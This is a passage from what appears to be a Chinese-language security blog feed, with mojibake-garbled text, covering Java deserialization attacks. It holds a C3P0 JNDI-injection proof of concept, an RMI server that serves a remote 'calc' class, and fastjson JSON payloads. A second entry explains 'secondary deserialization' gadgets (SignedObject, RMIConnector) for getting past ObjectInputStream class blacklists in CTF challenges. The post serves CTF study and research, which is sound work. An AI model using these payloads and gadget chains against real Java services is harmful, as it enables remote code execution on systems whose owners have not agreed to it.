class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; bArray[i]);<br>            <span class="hljs-keyword">if</span> (sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;<br>                sb.append(<span class="hljs-number">0</span>);<br>            &#125;<br><br>            sb.append(sTemp.toUpperCase());<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…åˆfastjsonä½¿ç”¨ï¼š</p><blockquote><p>{ â€œaâ€: { â€œ@typeâ€: â€œjava.lang.Classâ€, â€œvalâ€: â€œcom.mchange.v2.c3p0.WrapperConnectionPoolDataSourceâ€ }, â€œbâ€: { â€œ@typeâ€: â€œcom.mchange.v2.c3p0.WrapperConnectionPoolDataSourceâ€, â€œuserOverridesAsStringâ€: â€œHexAsciiSerializedMap:hexEXP;â€ } }</p></blockquote><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>æ²¡é”™ï¼Œè¿˜èƒ½é…JNDIã€‚ä½†æœ‰ç‰ˆæœ¬é™åˆ¶ã€‚</p><p>ä¹Ÿæ˜¯åœ¨fastjsonæˆ–jacksonç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œjdk8u191ä»¥ä¸‹ï¼ˆæ”¯æŒLDAP-JNDIæ³¨å…¥ï¼‰</p><ul><li><code>JndiRefConnectionPoolDataSource#setJndiName</code>æœ€åä¼šè°ƒç”¨<code>JndiRefDataSourceBase#setJndiName</code>ï¼Œè®¾ç½®<code>JndiRefDataSourceBase</code>ç±»çš„jndiNameå±æ€§ã€‚</li><li><code>JndiRefConnectionPoolDataSource#setLoginTimeout</code> &#x3D;&gt;<code>WrapperConnectionPoolDataSource#setLoginTimeout</code> &#x3D;&gt; <code>JndiRefForwardingDataSource#setLoginTimeout</code> &#x3D;&gt; <code>inner()</code> &#x3D;&gt; <code>dereference()</code></li></ul><p><code>JndiRefForwardingDataSource</code>ç»§æ‰¿è‡ª<code>JndiRefDataSourceBase</code>ï¼Œå¯è·å–å…¶jndiName</p><p><img src="/2024/08/05/C3P0/image-20240805000416111.png" alt="image-20240805000416111"></p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">JndiRefConnectionPoolDataSource</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiRefConnectionPoolDataSource</span>();<br>    exp.setJndiName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>);<br>    exp.setLoginTimeout(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIServerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.classæŒ‚webæœåŠ¡ï¼Œ<code>python -m http.server 8080</code></p><p><img src="/2024/08/05/C3P0/image-20240805000514530.png" alt="image-20240805000514530"></p><p>é…åˆfastjsonä½¿ç”¨</p><blockquote><p>{ â€œaâ€:{ â€œ@typeâ€:â€java.lang.Classâ€, â€œvalâ€:â€com.mchange.v2.c3p0.JndiRefForwardingDataSourceâ€ }, â€œbâ€:{ â€œ@typeâ€:â€com.mchange.v2.c3p0.JndiRefForwardingDataSourceâ€, â€œjndiNameâ€:â€rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;evilâ€, â€œloginTimeoutâ€:0 } }</p></blockquote><p>åœ¨fastjsonï¼Œjacksonç­‰ç¯å¢ƒä¸‹ï¼Œè°ƒç”¨JndiRefConnectionPoolDataSourceç±»çš„jndinameï¼Œlogintimeoutå±æ€§setteræ–¹æ³•ï¼Œå‘jndinameä¼ å…¥æ¶æ„RMIæœåŠ¡å™¨åœ°å€ï¼Œç„¶åè°ƒç”¨logintimeoutçš„setteræ–¹æ³•ä½¿å—å®³æœºå»lookupè®¾ç½®å¥½çš„jndinameä¸­çš„æ¶æ„åœ°å€ï¼Œé€ æˆJNDIæ³¨å…¥ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/c3p0">C3P0 | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äºŒæ¬¡ååºåˆ—åŒ–</title>
    <link href="/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¾ˆå¤šjavaé¢˜ç›®ï¼Œå¤§éƒ½å¼„äº†ä¸ªç±»ç»§æ‰¿<code>ObjectInputStream</code>ï¼Œé‡å†™å…¶<code>resolveClass</code>æ–¹æ³•ï¼Œåœ¨é‡Œé¢æ·»åŠ å¯¹ååºåˆ—åŒ–ç±»é»‘åå•çš„æ ¡éªŒã€‚è¿™ä¹Ÿä¸ºæˆ‘AWDPä¿®javaé¢˜æä¾›äº†ä¸€äº›æ€è·¯ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-built_in">super</span>(inputStream);<br>   &#125;<br><br>   <span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è¿™ç§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyownObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">ArrayList</span> <span class="hljs-variable">Blacklist</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyownObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>        <span class="hljs-built_in">this</span>.Blacklist.add(Hashtable.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HashSet.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(JdbcRowSetImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TreeMap.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HotSwappableTargetSource.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(XString.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TemplatesImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(ToStringBean.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.Blacklist.contains(desc.getName())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;dont do this&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™äº›é»‘åå•ä¸­çš„ç±»åœ¨ååºåˆ—åŒ–ä¸­å½“ç„¶æ˜¯å¾ˆæœ‰ç”¨é€”çš„ã€‚</p><p>ä½†æ˜¯åœ¨æ¯”èµ›åšé¢˜çš„æ—¶å€™å°±å¾ˆçƒ¦äº†ï¼Œè‹¥æ²¡æœ‰ç§¯ç´¯å……è¶³çš„Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ç»éªŒï¼Œå¾ˆéš¾ç»•ã€‚è€Œä¸”æ¯”èµ›æ—¶ä¸´æ—¶å»æ‰¾è§¦å‘ç±»ä¹ŸæŒºéš¾çš„ã€‚å°¤å…¶æ˜¯æ–­ç½‘çš„çº¿ä¸‹ç¯å¢ƒæ›´æ˜¯æŠ½è±¡ï¼Œç§ç§åŸå› ç”šè‡³ä½¿å¾—webé¢˜ç›®é‡ŒJavaååºåˆ—åŒ–åšå‡ºæ¥çš„è‚¯å®šæ˜¯æœ€å°‘çš„äººã€‚</p><p>Javaé¢˜å°±å˜æˆä¸€é“ç±»çš„æ’åˆ—ç»„åˆç¼åˆæ€ªäº†ğŸ¤¯ï¼Œæƒ³åŠæ³•ç¼å‡ºä¸€æ¡å¯ä»¥æ‰“é€šçš„åœ¨é»‘åå•ä¹‹å¤–çš„åˆ©ç”¨é“¾ã€‚</p><p>è¿™æ—¶å€™å°±å¯ä»¥è€ƒè™‘ä¸€ä¸‹äºŒæ¬¡ååºåˆ—åŒ–äº†ï¼Œä¸ç”¨ä½ å®šä¹‰çš„æ£€æµ‹é»‘åå•çš„<code>ObjectInputStream</code>å»åŠ è½½åºåˆ—åŒ–å¯¹è±¡ï¼Œè€Œæ˜¯æ‰¾åˆ°ä¸€æ¡å¯ä»¥è§¦å‘<code>readObject</code>çš„é“¾å­ï¼Œç”¨åŸç”Ÿçš„<code>ObjectInputStream</code>å»<code>resolveClass</code></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>é‡åˆ°è¿‡ä¸”å®æ“è¿‡ä¸¤æ¬¡çš„å¥½ä¸œè¥¿ã€‚</p><p>å…³é”®åœ¨äº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.security.SignedObject#getObject<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»åœ¨<code>Hessian</code>ååºåˆ—åŒ–ä¸­ä¹Ÿç”¨è¿‡ï¼ˆHessiançš„ä¼šæ”¾åœ¨åé¢å†æ›´ï¼‰ï¼Œç”±äº<code>Hessian</code>ååºåˆ—åŒ–çš„ç‰¹æ®Šæ€§ï¼Œä¸ä¼šæ‰§è¡Œç±»çš„<code>readObject</code>æ¥ååºåˆ—åŒ–ï¼Œè€Œæ˜¯é€šè¿‡åå°„è·å–<code>field</code>å†å¡«å……è¿›ä¸€ä¸ªç©ºçš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œ<code>_tfactory</code>åˆæ˜¯<code>transient</code>ä¿®é¥°ï¼Œ<code>writeObject</code>ä¸ä¼šå†™è¿›å»ï¼Œå¯¼è‡´<code>TemplatesImpl</code>ä¸èƒ½åˆ©ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SignedObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey,</span><br><span class="hljs-params">                        Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>            <span class="hljs-comment">// creating a stream pipe-line, from a to b</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>            <span class="hljs-comment">// write and flush the object content to byte array</span><br>            a.writeObject(object);<br>            a.flush();<br>            a.close();<br>            <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>            b.close();<br><br>            <span class="hljs-comment">// now sign the encapsulated object</span><br>            <span class="hljs-built_in">this</span>.sign(signingKey, signingEngine);<br>    &#125;<br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>        b.close();<br>        a.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§¦å‘æ–¹å¼ï¼šèƒ½å¤Ÿæ‰§è¡Œç±»çš„<code>getter</code>æ–¹æ³•ï¼Œæ¯”å¦‚é…åˆ<code>ROME</code>æˆ–<code>FastJson</code>æ‰“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">KeyPairGenerator keyPairGenerator;<br>keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(object_with_evil_readObject, privateKey, signingEngine);<br></code></pre></td></tr></table></figure><h2 id="SerializationUtils"><a href="#SerializationUtils" class="headerlink" title="SerializationUtils"></a>SerializationUtils</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.util.SerializationUtils.deserialize<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> <span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>    <span class="hljs-keyword">if</span> (bytes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125; <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.remote.rmi.RMIConnector#findRMIServerJRMP<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJRMP</span><span class="hljs-params">(String base64, Map&lt;String, ?&gt; env, <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serialized = base64ToByteArray(base64);<br>    &#125; <span class="hljs-comment">//....</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> EnvHelp.resolveClientClassLoader(env);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">oin</span> <span class="hljs-operator">=</span><br>        (loader == <span class="hljs-literal">null</span>) ?<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bin) :<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStreamWithLoader</span>(bin, loader);<br>    <span class="hljs-keyword">final</span> Object stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = oin.readObject();<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥èƒ½æ§åˆ¶base64å‚æ•°çš„å†…å®¹å°±å¯ä»¥ä»»æ„ååºåˆ—åŒ–ã€‚</p><p>å¾€ä¸Šå›æº¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServer</span><span class="hljs-params">(JMXServiceURL directoryURL,</span><br><span class="hljs-params">                                Map&lt;String, Object&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isIiop</span> <span class="hljs-operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (isIiop) &#123;<br>        <span class="hljs-comment">// Make sure java.naming.corba.orb is in the Map.</span><br>        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> directoryURL.getURLPath();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> path.indexOf(<span class="hljs-string">&#x27;;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (end &lt; <span class="hljs-number">0</span>) end = path.length();<br>    <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/jndi/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJNDI(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/stub/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJRMP(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/ior/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!IIOPHelper.isAvailable())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;iiop protocol not available&quot;</span>);<br>        <span class="hljs-keyword">return</span> findRMIServerIIOP(path.substring(<span class="hljs-number">5</span>,end), environment, isIiop);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +<br>            <span class="hljs-string">&quot;or /ior/: &quot;</span> + path;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MalformedURLException</span>(msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>path</code>ä»¥<code>/stub/</code>å¼€å¤´å°±èƒ½è¿›åˆ°<code>findRMIServerJRMP</code>ï¼Œ<code>path</code>ä¸­<code>/stub/</code>ä¸ºåºåˆ—åŒ–å­—èŠ‚çš„base64ç¼–ç </p><p><code>path</code>ç”±<code>directoryURL#getURLPath</code>å¾—åˆ°</p><p>åœ¨å¾€ä¸Šå‘ç°<code>connect</code>å’Œ<code>doStart</code>è°ƒç”¨äº†<code>findRMIServer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 